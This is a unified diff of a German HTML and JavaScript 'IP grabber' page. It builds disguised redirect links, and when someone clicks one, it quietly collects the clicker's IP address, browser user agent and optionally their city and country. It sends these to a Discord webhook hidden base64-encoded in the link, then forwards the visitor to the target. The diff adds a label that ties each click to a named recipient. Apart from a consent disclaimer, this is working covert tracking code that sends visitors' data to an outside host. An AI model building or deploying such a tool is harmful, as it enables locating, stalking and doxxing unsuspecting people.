@@ -3,429 +3,209 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>IP Grabber · Final mit Standort</title>
+    <title>IP Grabber · Final mit Empfängerkennung</title>
     <style>
-        /* Basis – Seite verstecken, bis JS entschieden hat */
-        body {
-            visibility: hidden;
-            margin: 0;
-            font-family: 'Segoe UI', Tahoma, sans-serif;
-        }
-        body.admin-mode {
-            visibility: visible;
-            background: #f1f5f9;
-            min-height: 100vh;
-            padding: 20px;
-            color: #0f172a;
-        }
-        .container {
-            max-width: 800px;
-            margin: 0 auto;
-            background: white;
-            border-radius: 28px;
-            box-shadow: 0 20px 40px -10px rgba(0,0,0,0.1);
-            padding: 30px;
-        }
-        h1 { display: flex; align-items: center; gap: 10px; }
-        h1::before { content: "🌐"; font-size: 2rem; }
-        .warning {
-            background: #fffbeb;
-            border: 1px solid #fcd34d;
-            color: #92400e;
-            padding: 16px;
-            border-radius: 16px;
-            margin-bottom: 28px;
-        }
+        body { visibility: hidden; margin: 0; font-family: 'Segoe UI', Tahoma, sans-serif; }
+        body.admin-mode { visibility: visible; background: #f1f5f9; min-height: 100vh; padding: 20px; color: #0f172a; }
+        .container { max-width: 800px; margin: 0 auto; background: white; border-radius: 28px; box-shadow: 0 20px 40px -10px rgba(0,0,0,0.1); padding: 30px; }
+        h1 { display: flex; align-items: center; gap: 10px; } h1::before { content: "🌐"; font-size: 2rem; }
+        .warning { background: #fffbeb; border: 1px solid #fcd34d; color: #92400e; padding: 16px; border-radius: 16px; margin-bottom: 28px; }
         .tabs { display: flex; gap: 6px; margin-bottom: 24px; border-bottom: 2px solid #cbd5e1; }
-        .tab {
-            padding: 12px 24px;
-            background: none;
-            border: none;
-            cursor: pointer;
-            font-weight: 600;
-            color: #64748b;
-            border-radius: 40px 40px 0 0;
-        }
+        .tab { padding: 12px 24px; background: none; border: none; cursor: pointer; font-weight: 600; color: #64748b; border-radius: 40px 40px 0 0; }
         .tab.active { color: #2563eb; border-bottom: 3px solid #2563eb; background: white; }
-        .tab-content { display: none; }
-        .tab-content.active { display: block; }
-        .form-group { margin-bottom: 24px; }
-        label { display: block; margin-bottom: 8px; font-weight: 600; }
-        input, textarea {
-            width: 100%;
-            padding: 14px 18px;
-            border: 1.5px solid #cbd5e1;
-            border-radius: 20px;
-            font-size: 1rem;
-        }
-        button {
-            background: #2563eb;
-            color: white;
-            border: none;
-            padding: 14px 28px;
-            border-radius: 40px;
-            font-weight: 600;
-            cursor: pointer;
-        }
-        button.copy-btn { background: #10b981; }
-        button.secondary { background: #e2e8f0; color: #1e293b; }
-        .url-display {
-            background: #f8fafc;
-            padding: 16px;
-            border-radius: 24px;
-            font-family: monospace;
-            word-break: break-all;
-            border: 1.5px solid #cbd5e1;
-        }
+        .tab-content { display: none; } .tab-content.active { display: block; }
+        .form-group { margin-bottom: 24px; } label { display: block; margin-bottom: 8px; font-weight: 600; }
+        input, textarea { width: 100%; padding: 14px 18px; border: 1.5px solid #cbd5e1; border-radius: 20px; font-size: 1rem; }
+        button { background: #2563eb; color: white; border: none; padding: 14px 28px; border-radius: 40px; font-weight: 600; cursor: pointer; }
+        button.copy-btn { background: #10b981; } button.secondary { background: #e2e8f0; color: #1e293b; }
+        .url-display { background: #f8fafc; padding: 16px; border-radius: 24px; font-family: monospace; word-break: break-all; border: 1.5px solid #cbd5e1; }
         .stats { margin-top: 20px; padding: 16px; background: #f1f5f9; border-radius: 18px; }
-        table { width: 100%; border-collapse: collapse; margin-top: 20px; }
-        th { background: #eef2ff; padding: 12px; }
-        td { padding: 12px; border-bottom: 1px solid #e2e8f0; }
-        .badge { background: #e2e8f0; padding: 4px 12px; border-radius: 30px; }
+        table { width: 100%; border-collapse: collapse; margin-top: 20px; } th { background: #eef2ff; padding: 12px; } td { padding: 12px; border-bottom: 1px solid #e2e8f0; }
         .flex-row { display: flex; gap: 12px; align-items: center; }
     </style>
 </head>
 <body>
     <div id="adminPanel" style="display:none;">
         <div class="container">
-            <h1>IP‑Logger · Final</h1>
-            <div class="warning">
-                <strong>⚖️ Nur für Bildungs‑ und Testzwecke mit Einwilligung.</strong><br>
-                Zeigt im Discord‑Embed an, wer geklickt hat (IP, Browser, Standort).
-            </div>
-
+            <h1>IP‑Logger · Mit Empfängerkennung</h1>
+            <div class="warning"><strong>⚖️ Nur für Bildungs‑ und Testzwecke mit Einwilligung.</strong><br>Zeigt in Discord an, für wen der Link bestimmt war.</div>
             <div class="tabs">
                 <div class="tab active" data-tab="generator">🔗 Link Generator</div>
                 <div class="tab" data-tab="logs">📋 Lokale Logs</div>
                 <div class="tab" data-tab="settings">⚙️ Einstellungen</div>
             </div>
-
             <!-- Generator -->
             <div id="generator" class="tab-content active">
-                <div class="form-group">
-                    <label>🎯 Ziel‑URL</label>
-                    <input type="url" id="targetUrl" value="https://example.com" required>
-                </div>
-                <div class="form-group">
-                    <label>📡 Discord Webhook URL (wird in Link eingebettet)</label>
-                    <input type="text" id="webhookInput" placeholder="https://discord.com/api/webhooks/...">
-                    <div class="flex-row" style="margin-top:8px;">
-                        <button class="secondary" id="testWebhookBtn">🧪 Webhook testen</button>
-                        <span id="testResult"></span>
-                    </div>
-                </div>
-                <div class="form-group">
-                    <label>🌍 Server‑Basis‑URL (wo diese Datei liegt)</label>
-                    <input type="url" id="baseUrlInput" placeholder="Leer lassen für aktuelle Adresse">
-                </div>
-                <div class="form-group">
-                    <label>💬 Eigene Nachricht (für Discord)</label>
-                    <input type="text" id="customMsg" placeholder="Neuer Klick">
-                </div>
+                <div class="form-group"><label>🎯 Ziel‑URL</label><input type="url" id="targetUrl" value="https://example.com"></div>
+                <div class="form-group"><label>📡 Discord Webhook URL</label><input type="text" id="webhookInput" placeholder="https://discord.com/api/webhooks/..."><div class="flex-row" style="margin-top:8px;"><button class="secondary" id="testWebhookBtn">🧪 Webhook testen</button><span id="testResult"></span></div></div>
+                <div class="form-group"><label>🌍 Server‑Basis‑URL</label><input type="url" id="baseUrlInput" placeholder="Leer = aktuelle Adresse"></div>
+                <div class="form-group"><label>💬 Eigene Nachricht</label><input type="text" id="customMsg" placeholder="Neuer Klick"></div>
+                <div class="form-group"><label>👤 Kennzeichnung (z.B. Name des Empfängers)</label><input type="text" id="labelInput" placeholder="Max / Testperson 1"></div>
                 <button id="generateBtn">✨ Link generieren</button>
-
                 <div id="resultPanel" style="display:none; margin-top:28px;">
-                    <h3>🔽 Dein IP‑Grab‑Link</h3>
-                    <div class="url-display" id="generatedUrl"></div>
-                    <div class="flex-row" style="margin-top:16px;">
-                        <button class="copy-btn" id="copyBtn">📋 Kopieren</button>
-                        <button class="secondary" id="testOwnBtn">🧪 Selbst testen</button>
-                    </div>
-                    <div class="stats">
-                        <p>👁️ Klicks: <strong id="clickCount">0</strong> | Letzter: <span id="lastAccess">—</span></p>
-                        <p>🔍 ID: <span id="linkIdDisplay"></span></p>
-                    </div>
+                    <h3>🔽 Dein Link</h3><div class="url-display" id="generatedUrl"></div>
+                    <div class="flex-row" style="margin-top:16px;"><button class="copy-btn" id="copyBtn">📋 Kopieren</button><button class="secondary" id="testOwnBtn">🧪 Selbst testen</button></div>
+                    <div class="stats"><p>👁️ Klicks: <strong id="clickCount">0</strong> | Letzter: <span id="lastAccess">—</span></p><p>🔍 ID: <span id="linkIdDisplay"></span></p></div>
                 </div>
             </div>
-
             <!-- Logs -->
             <div id="logs" class="tab-content">
-                <h3>📜 Lokale Logs (nur deine eigenen Tests)</h3>
-                <button class="secondary" id="clearLogsBtn">🗑️ Alle löschen</button>
-                <table>
-                    <thead><tr><th>IP</th><th>Zeit</th><th>User‑Agent</th><th>Link</th></tr></thead>
-                    <tbody id="logsBody"></tbody>
-                </table>
+                <h3>📜 Lokale Logs</h3><button class="secondary" id="clearLogsBtn">🗑️ Alle löschen</button>
+                <table><thead><tr><th>IP</th><th>Zeit</th><th>User‑Agent</th><th>Link</th></tr></thead><tbody id="logsBody"></tbody></table>
             </div>
-
             <!-- Einstellungen -->
             <div id="settings" class="tab-content">
                 <h3>Einstellungen</h3>
-                <div class="form-group">
-                    <label>⏱️ Weiterleitungsverzögerung (ms)</label>
-                    <input type="number" id="delayInput" value="3000" min="0" max="10000">
-                </div>
-                <div class="form-group">
-                    <label><input type="checkbox" id="collectUACb" checked> User‑Agent erfassen</label>
-                </div>
-                <div class="form-group">
-                    <label><input type="checkbox" id="collectLocationCb"> Standort (Stadt, Land) ermitteln</label>
-                    <small>Nutzt ipapi.co – nur mit Einwilligung aktivieren.</small>
-                </div>
-                <div class="form-group">
-                    <label><input type="checkbox" id="storeLocalCb" checked> Lokal speichern</label>
-                </div>
-                <div class="form-group">
-                    <label>Standard‑Basis‑URL</label>
-                    <input type="url" id="defaultBaseUrl" placeholder="https://...">
-                </div>
+                <div class="form-group"><label>⏱️ Verzögerung (ms)</label><input type="number" id="delayInput" value="3000"></div>
+                <div class="form-group"><label><input type="checkbox" id="collectUACb" checked> User‑Agent erfassen</label></div>
+                <div class="form-group"><label><input type="checkbox" id="collectLocationCb"> Standort ermitteln (ipapi.co)</label></div>
+                <div class="form-group"><label><input type="checkbox" id="storeLocalCb" checked> Lokal speichern</label></div>
+                <div class="form-group"><label>Standard‑Basis‑URL</label><input type="url" id="defaultBaseUrl"></div>
                 <button id="saveSettingsBtn">💾 Speichern</button>
             </div>
         </div>
     </div>
-
     <script>
         (function(){
             "use strict";
+            // ---------- STATE ----------
+            let links=[],ipLogs=[],settings={delay:3000,collectUA:true,collectLocation:false,storeLocal:true,defaultBase:''},currentLinkId=null;
 
-            // ---------- GLOBALE VARIABLEN ----------
-            let links = [];
-            let ipLogs = [];
-            let settings = {
-                delay: 3000,
-                collectUA: true,
-                collectLocation: false,
-                storeLocal: true,
-                defaultBase: ''
-            };
-            let currentLinkId = null;
-
-            // ---------- HILFSFUNKTIONEN ----------
-            function generateId() { return Date.now() + '-' + Math.random().toString(36).substr(2,8); }
-            function formatDate(iso) { return new Date(iso).toLocaleString('de-DE'); }
-            function base64Encode(str) { return btoa(unescape(encodeURIComponent(str))); }
-            function base64Decode(str) { return decodeURIComponent(escape(atob(str))); }
+            // ---------- UTILS ----------
+            function generateId(){return Date.now()+'-'+Math.random().toString(36).substr(2,8);}
+            function formatDate(iso){return new Date(iso).toLocaleString('de-DE');}
+            function base64Encode(str){return btoa(unescape(encodeURIComponent(str)));}
+            function base64Decode(str){return decodeURIComponent(escape(atob(str)));}
 
             // ---------- STORAGE ----------
-            function loadStorage() {
-                try {
-                    const l = localStorage.getItem('ipg_links'); if(l) links = JSON.parse(l);
-                    const g = localStorage.getItem('ipg_logs'); if(g) ipLogs = JSON.parse(g);
-                    const s = localStorage.getItem('ipg_settings'); if(s) settings = {...settings, ...JSON.parse(s)};
-                } catch(e){}
-                if (document.getElementById('delayInput')) {
-                    document.getElementById('delayInput').value = settings.delay;
-                    document.getElementById('collectUACb').checked = settings.collectUA;
-                    document.getElementById('collectLocationCb').checked = settings.collectLocation;
-                    document.getElementById('storeLocalCb').checked = settings.storeLocal;
-                    document.getElementById('defaultBaseUrl').value = settings.defaultBase || '';
+            function loadStorage(){
+                try{
+                    const l=localStorage.getItem('ipg_links');if(l)links=JSON.parse(l);
+                    const g=localStorage.getItem('ipg_logs');if(g)ipLogs=JSON.parse(g);
+                    const s=localStorage.getItem('ipg_settings');if(s)settings={...settings,...JSON.parse(s)};
+                }catch(e){}
+                if(document.getElementById('delayInput')){
+                    document.getElementById('delayInput').value=settings.delay;
+                    document.getElementById('collectUACb').checked=settings.collectUA;
+                    document.getElementById('collectLocationCb').checked=settings.collectLocation;
+                    document.getElementById('storeLocalCb').checked=settings.storeLocal;
+                    document.getElementById('defaultBaseUrl').value=settings.defaultBase||'';
                 }
             }
-            function saveLinks() { if(settings.storeLocal) localStorage.setItem('ipg_links', JSON.stringify(links)); }
-            function saveLogs() { if(settings.storeLocal) localStorage.setItem('ipg_logs', JSON.stringify(ipLogs)); }
-            function saveSettings() {
-                if (!document.getElementById('delayInput')) return;
-                settings.delay = parseInt(document.getElementById('delayInput').value,10)||3000;
-                settings.collectUA = document.getElementById('collectUACb').checked;
-                settings.collectLocation = document.getElementById('collectLocationCb').checked;
-                settings.storeLocal = document.getElementById('storeLocalCb').checked;
-                settings.defaultBase = document.getElementById('defaultBaseUrl').value.trim();
-                localStorage.setItem('ipg_settings', JSON.stringify(settings));
+            function saveLinks(){if(settings.storeLocal)localStorage.setItem('ipg_links',JSON.stringify(links));}
+            function saveLogs(){if(settings.storeLocal)localStorage.setItem('ipg_logs',JSON.stringify(ipLogs));}
+            function saveSettings(){
+                if(!document.getElementById('delayInput'))return;
+                settings.delay=parseInt(document.getElementById('delayInput').value,10)||3000;
+                settings.collectUA=document.getElementById('collectUACb').checked;
+                settings.collectLocation=document.getElementById('collectLocationCb').checked;
+                settings.storeLocal=document.getElementById('storeLocalCb').checked;
+                settings.defaultBase=document.getElementById('defaultBaseUrl').value.trim();
+                localStorage.setItem('ipg_settings',JSON.stringify(settings));
             }
 
-            // ---------- IP & STANDORT ----------
-            async function fetchIP() {
-                try {
-                    const res = await fetch('https://api.ipify.org?format=json');
-                    return (await res.json()).ip;
-                } catch(e) { return '0.0.0.0'; }
-            }
+            // ---------- IP & LOCATION ----------
+            async function fetchIP(){try{const r=await fetch('https://api.ipify.org?format=json');return(await r.json()).ip}catch(e){return '0.0.0.0';}}
+            async function fetchLocation(ip){if(!settings.collectLocation)return null;try{const r=await fetch(`https://ipapi.co/${ip}/json/`);const d=await r.json();if(d.error)return null;return `${d.city||'Unbekannt'}, ${d.country_name||''}`.trim();}catch(e){return null;}}
 
-            async function fetchLocation(ip) {
-                if (!settings.collectLocation) return null;
-                try {
-                    const res = await fetch(`https://ipapi.co/${ip}/json/`);
-                    const data = await res.json();
-                    if (data.error) return null;
-                    return `${data.city || 'Unbekannt'}, ${data.country_name || ''}`.trim();
-                } catch(e) { return null; }
-            }
-
-            // ---------- DISCORD SENDEN (mit Besucher‑Info) ----------
-            async function sendDiscord(webhookUrl, ip, ua, location, linkId, customMsg) {
-                if (!webhookUrl || !webhookUrl.includes('discord.com/api/webhooks')) return false;
-
-                const locationText = location ? `\n📍 **Standort:** ${location}` : '';
-                const description = `${customMsg || 'Neuer Klick'}\n\n` +
-                    `**👤 Besucher:**\n` +
-                    `🌐 IP: \`${ip}\`${locationText}\n` +
-                    `🖥️ User‑Agent: ${ua || 'nicht erfasst'}`;
-
-                const embed = {
-                    title: "🌍 IP‑Logger – Jemand hat den Link geöffnet",
-                    description: description,
-                    color: 0x3b82f6,
-                    timestamp: new Date().toISOString(),
-                    footer: { text: `Link‑ID: ${linkId}` }
-                };
-                try {
-                    const resp = await fetch(webhookUrl, {
-                        method: 'POST',
-                        headers: {'Content-Type':'application/json'},
-                        body: JSON.stringify({ embeds: [embed] })
-                    });
+            // ---------- DISCORD SENDEN ----------
+            async function sendDiscord(webhookUrl, ip, ua, location, linkId, customMsg, label){
+                if(!webhookUrl||!webhookUrl.includes('discord.com/api/webhooks'))return false;
+                const locationText=location?`\n📍 Standort: ${location}`:'';
+                const labelText=label?`\n👤 Gekennzeichnet als: **${label}**`:'';
+                const description=`${customMsg||'Neuer Klick'}\n\n🌐 IP: \`${ip}\`${locationText}${labelText}\n🖥️ User‑Agent: ${ua||'nicht erfasst'}`;
+                const embed={title:"🌍 IP‑Logger",description,color:0x3b82f6,timestamp:new Date().toISOString(),footer:{text:`Link‑ID: ${linkId}`}};
+                try{
+                    const resp=await fetch(webhookUrl,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({embeds:[embed]})});
                     return resp.ok;
-                } catch(e) { return false; }
+                }catch(e){return false;}
             }
 
-            // ---------- REDIRECT HANDLER (sofort ausgeführt) ----------
-            async function handleRedirect() {
-                const params = new URLSearchParams(window.location.search);
-                const linkId = params.get('id');
-                const target = params.get('to');
-                const encodedWh = params.get('wh');
-                const encodedMsg = params.get('msg');
-                const debug = params.get('debug') === '1';
-
-                if (!linkId || !target || !encodedWh) return false;
-
-                let webhookUrl = '', customMsg = '';
-                try {
-                    webhookUrl = base64Decode(encodedWh);
-                    if (encodedMsg) customMsg = base64Decode(encodedMsg);
-                } catch(e) {
-                    document.body.innerHTML = '<h2>Fehler: Ungültiger Link</h2>';
-                    document.body.style.visibility = 'visible';
-                    return true;
+            // ---------- REDIRECT HANDLER ----------
+            async function handleRedirect(){
+                const params=new URLSearchParams(window.location.search);
+                const linkId=params.get('id'),target=params.get('to'),encodedWh=params.get('wh'),encodedMsg=params.get('msg'),encodedLabel=params.get('lbl'),debug=params.get('debug')==='1';
+                if(!linkId||!target||!encodedWh)return false;
+                let webhookUrl='',customMsg='',label='';
+                try{
+                    webhookUrl=base64Decode(encodedWh);
+                    if(encodedMsg)customMsg=base64Decode(encodedMsg);
+                    if(encodedLabel)label=base64Decode(encodedLabel);
+                }catch(e){document.body.innerHTML='<h2>Fehler: Ungültiger Link</h2>';document.body.style.visibility='visible';return true;}
+                const ip=await fetchIP();
+                const ua=settings.collectUA?navigator.userAgent:null;
+                const location=settings.collectLocation?await fetchLocation(ip):null;
+                sendDiscord(webhookUrl,ip,ua,location,linkId,customMsg,label);
+                if(settings.storeLocal){
+                    const logEntry={id:generateId(),ip,ua,location,label,linkId,timestamp:new Date().toISOString()};
+                    ipLogs.push(logEntry);saveLogs();
+                    const link=links.find(l=>l.id===linkId);
+                    if(link){link.clicks++;link.lastAccess=new Date().toISOString();saveLinks();}
                 }
-
-                // IP + ggf. Standort parallel abrufen
-                const ip = await fetchIP();
-                const ua = settings.collectUA ? navigator.userAgent : null;
-                const location = settings.collectLocation ? await fetchLocation(ip) : null;
-
-                // Discord benachrichtigen (mit allen Infos)
-                sendDiscord(webhookUrl, ip, ua, location, linkId, customMsg);
-
-                // Lokal loggen
-                if (settings.storeLocal) {
-                    const logEntry = { id: generateId(), ip, ua, location, linkId, timestamp: new Date().toISOString() };
-                    ipLogs.push(logEntry);
-                    saveLogs();
-                    const link = links.find(l => l.id === linkId);
-                    if (link) { link.clicks++; link.lastAccess = new Date().toISOString(); saveLinks(); }
-                }
-
-                // Weiterleitungsseite
-                document.body.innerHTML = `
-                    <div style="display:flex; align-items:center; justify-content:center; height:100vh; background:#0f172a; color:#e2e8f0; font-family:system-ui;">
-                        <div style="text-align:center;">
-                            <h2>Weiterleitung...</h2>
-                            <div style="width:50px; height:50px; border:5px solid #334155; border-top-color:#38bdf8; border-radius:50%; animation:spin 1s infinite; margin:20px auto;"></div>
-                            <style>@keyframes spin{to{transform:rotate(360deg)}}</style>
-                            ${debug ? `<p style="margin-top:20px;">IP: ${ip}<br>Standort: ${location||'aus'}</p>` : ''}
-                        </div>
-                    </div>
-                `;
-                document.body.style.visibility = 'visible';
-
-                setTimeout(() => { window.location.href = target; }, settings.delay);
+                document.body.innerHTML=`<div style="display:flex;align-items:center;justify-content:center;height:100vh;background:#0f172a;color:#e2e8f0;font-family:system-ui;"><div style="text-align:center;"><h2>Weiterleitung...</h2><div style="width:50px;height:50px;border:5px solid #334155;border-top-color:#38bdf8;border-radius:50%;animation:spin 1s infinite;margin:20px auto;"></div><style>@keyframes spin{to{transform:rotate(360deg)}}</style>${debug?`<p>IP: ${ip}<br>Standort: ${location||'aus'}<br>Label: ${label||'keine'}</p>`:''}</div></div>`;
+                document.body.style.visibility='visible';
+                setTimeout(()=>{window.location.href=target;},settings.delay);
                 return true;
             }
 
             // ---------- ADMIN PANEL ----------
-            function showAdminPanel() {
-                document.getElementById('adminPanel').style.display = 'block';
+            function showAdminPanel(){
+                document.getElementById('adminPanel').style.display='block';
                 document.body.classList.add('admin-mode');
-                document.body.style.visibility = 'visible';
+                document.body.style.visibility='visible';
                 initAdminUI();
                 renderLogs();
             }
-
-            function renderLogs() {
-                const tbody = document.getElementById('logsBody');
-                if (!tbody) return;
-                if (!ipLogs.length) {
-                    tbody.innerHTML = '<tr><td colspan="4">Keine Logs</td></tr>';
-                    return;
-                }
-                tbody.innerHTML = [...ipLogs].reverse().map(l => `
-                    <tr>
-                        <td>${l.ip} ${l.location ? '<br><small>'+l.location+'</small>' : ''}</td>
-                        <td>${formatDate(l.timestamp)}</td>
-                        <td>${l.ua?.substring(0,30)||'-'}</td>
-                        <td>${l.linkId.slice(-6)}</td>
-                    </tr>
-                `).join('');
+            function renderLogs(){
+                const tbody=document.getElementById('logsBody');
+                if(!tbody)return;
+                if(!ipLogs.length){tbody.innerHTML='<tr><td colspan="4">Keine Logs</td></tr>';return;}
+                tbody.innerHTML=[...ipLogs].reverse().map(l=>`<tr><td>${l.ip}${l.location?'<br><small>'+l.location+'</small>':''}${l.label?'<br>🏷️ '+l.label:''}</td><td>${formatDate(l.timestamp)}</td><td>${l.ua?.substring(0,30)||'-'}</td><td>${l.linkId.slice(-6)}</td></tr>`).join('');
             }
-
-            function initAdminUI() {
-                document.querySelectorAll('.tab').forEach(t => {
-                    t.addEventListener('click', () => {
-                        document.querySelectorAll('.tab, .tab-content').forEach(el => el.classList.remove('active'));
-                        t.classList.add('active');
-                        document.getElementById(t.dataset.tab).classList.add('active');
-                    });
+            function initAdminUI(){
+                document.querySelectorAll('.tab').forEach(t=>{t.addEventListener('click',()=>{document.querySelectorAll('.tab,.tab-content').forEach(el=>el.classList.remove('active'));t.classList.add('active');document.getElementById(t.dataset.tab).classList.add('active');})});
+                document.getElementById('generateBtn').addEventListener('click',()=>{
+                    const target=document.getElementById('targetUrl').value.trim();
+                    const webhook=document.getElementById('webhookInput').value.trim();
+                    if(!target||!webhook){alert('Ziel-URL und Webhook erforderlich');return;}
+                    if(!webhook.includes('discord.com/api/webhooks')){alert('Ungültige Webhook-URL');return;}
+                    const customMsg=document.getElementById('customMsg').value.trim();
+                    const label=document.getElementById('labelInput').value.trim();
+                    const linkId=generateId();
+                    let base=document.getElementById('baseUrlInput').value.trim();
+                    if(!base)base=settings.defaultBase;
+                    if(!base)base=window.location.origin+window.location.pathname;
+                    if(!base.endsWith('/')&&!base.includes('?'))base+='/';
+                    const encodedWh=base64Encode(webhook);
+                    const params=new URLSearchParams();
+                    params.set('id',linkId);params.set('to',target);params.set('wh',encodedWh);
+                    if(customMsg)params.set('msg',base64Encode(customMsg));
+                    if(label)params.set('lbl',base64Encode(label));
+                    const finalUrl=base+(base.includes('?')?'&':'?')+params.toString();
+                    const newLink={id:linkId,target,webhook,customMsg,label,clicks:0,lastAccess:null};
+                    links.push(newLink);saveLinks();
+                    document.getElementById('resultPanel').style.display='block';
+                    document.getElementById('generatedUrl').textContent=finalUrl;
+                    document.getElementById('linkIdDisplay').textContent=linkId;
+                    currentLinkId=linkId;
+                    document.getElementById('clickCount').textContent='0';
+                    document.getElementById('lastAccess').textContent='—';
                 });
-
-                document.getElementById('generateBtn').addEventListener('click', () => {
-                    const target = document.getElementById('targetUrl').value.trim();
-                    const webhook = document.getElementById('webhookInput').value.trim();
-                    if (!target || !webhook) { alert('Ziel-URL und Webhook erforderlich'); return; }
-                    if (!webhook.includes('discord.com/api/webhooks')) { alert('Ungültige Webhook-URL'); return; }
-
-                    const customMsg = document.getElementById('customMsg').value.trim();
-                    const linkId = generateId();
-                    let base = document.getElementById('baseUrlInput').value.trim();
-                    if (!base) base = settings.defaultBase;
-                    if (!base) base = window.location.origin + window.location.pathname;
-                    if (!base.endsWith('/') && !base.includes('?')) base += '/';
-
-                    const encodedWh = base64Encode(webhook);
-                    const params = new URLSearchParams();
-                    params.set('id', linkId);
-                    params.set('to', target);
-                    params.set('wh', encodedWh);
-                    if (customMsg) params.set('msg', base64Encode(customMsg));
-                    const finalUrl = base + (base.includes('?') ? '&' : '?') + params.toString();
-
-                    const newLink = { id: linkId, target, webhook, customMsg, clicks:0, lastAccess:null };
-                    links.push(newLink);
-                    saveLinks();
-
-                    document.getElementById('resultPanel').style.display = 'block';
-                    document.getElementById('generatedUrl').textContent = finalUrl;
-                    document.getElementById('linkIdDisplay').textContent = linkId;
-                    currentLinkId = linkId;
-                    document.getElementById('clickCount').textContent = '0';
-                    document.getElementById('lastAccess').textContent = '—';
+                document.getElementById('copyBtn').addEventListener('click',()=>navigator.clipboard?.writeText(document.getElementById('generatedUrl').textContent).then(()=>alert('Kopiert!')));
+                document.getElementById('testOwnBtn').addEventListener('click',()=>{if(!currentLinkId)return alert('Kein Link generiert.');window.open(document.getElementById('generatedUrl').textContent+'&debug=1','_blank');});
+                document.getElementById('testWebhookBtn').addEventListener('click',async()=>{
+                    const wh=document.getElementById('webhookInput').value.trim();
+                    if(!wh)return alert('Webhook eingeben');
+                    const ok=await sendDiscord(wh,'Test-IP','Test-UA','Test-Standort','test','Testnachricht','TestLabel');
+                    document.getElementById('testResult').textContent=ok?'✅ Erfolg':'❌ Fehler';
                 });
-
-                document.getElementById('copyBtn').addEventListener('click', () => {
-                    navigator.clipboard?.writeText(document.getElementById('generatedUrl').textContent).then(() => alert('Kopiert!'));
-                });
-
-                document.getElementById('testOwnBtn').addEventListener('click', () => {
-                    if (!currentLinkId) return alert('Kein Link generiert.');
-                    window.open(document.getElementById('generatedUrl').textContent + '&debug=1', '_blank');
-                });
-
-                document.getElementById('testWebhookBtn').addEventListener('click', async () => {
-                    const wh = document.getElementById('webhookInput').value.trim();
-                    if (!wh) return alert('Webhook eingeben');
-                    const ok = await sendDiscord(wh, 'Test-IP', 'Test-UA', 'Test-Standort', 'test', 'Testnachricht');
-                    document.getElementById('testResult').textContent = ok ? '✅ Erfolg' : '❌ Fehler';
-                });
-
-                document.getElementById('clearLogsBtn').addEventListener('click', () => {
-                    ipLogs = []; saveLogs(); renderLogs();
-                });
-
-                document.getElementById('saveSettingsBtn').addEventListener('click', () => {
-                    saveSettings();
-                    alert('Gespeichert');
-                });
+                document.getElementById('clearLogsBtn').addEventListener('click',()=>{ipLogs=[];saveLogs();renderLogs();});
+                document.getElementById('saveSettingsBtn').addEventListener('click',()=>{saveSettings();alert('Gespeichert');});
             }
 
             // ---------- START ----------
             loadStorage();
-
-            (async function(){
-                const isRedirect = await handleRedirect();
-                if (!isRedirect) {
-                    showAdminPanel();
-                }
-            })();
+            (async function(){if(!(await handleRedirect()))showAdminPanel();})();
         })();
     </script>
 </body>
